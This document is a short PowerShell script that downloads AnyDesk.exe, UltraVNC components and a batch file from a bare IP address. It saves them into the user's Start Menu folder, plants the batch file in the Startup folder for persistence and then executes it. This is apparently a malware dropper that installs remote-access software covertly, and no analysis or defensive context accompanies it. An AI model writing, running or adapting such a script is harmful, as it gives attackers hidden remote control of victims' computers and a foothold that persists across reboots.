$down = New-Object System.Net.WebClient
$url  = 'http://44.203.122.41:80/AnyDesk.exe'
$file = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\AnyDesk.exe"
$down.DownloadFile($url, $file);

$down = New-Object System.Net.WebClient
$url  = 'http://44.203.122.41:80/vnchooks.dll'
$file = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\vnchooks.dll"
$down.DownloadFile($url, $file);

$down = New-Object System.Net.WebClient
$url  = 'http://44.203.122.41:80/UltraVNC.ini'
$file = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\UltraVNC.ini"
$down.DownloadFile($url, $file);

$down = New-Object System.Net.WebClient
$url  = 'http://44.203.122.41:80/Night.bat'
$file = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Night.bat"
$down.DownloadFile($url, $file)

$exec = New-Object -ComObject shell.application
$exec.ShellExecute($file);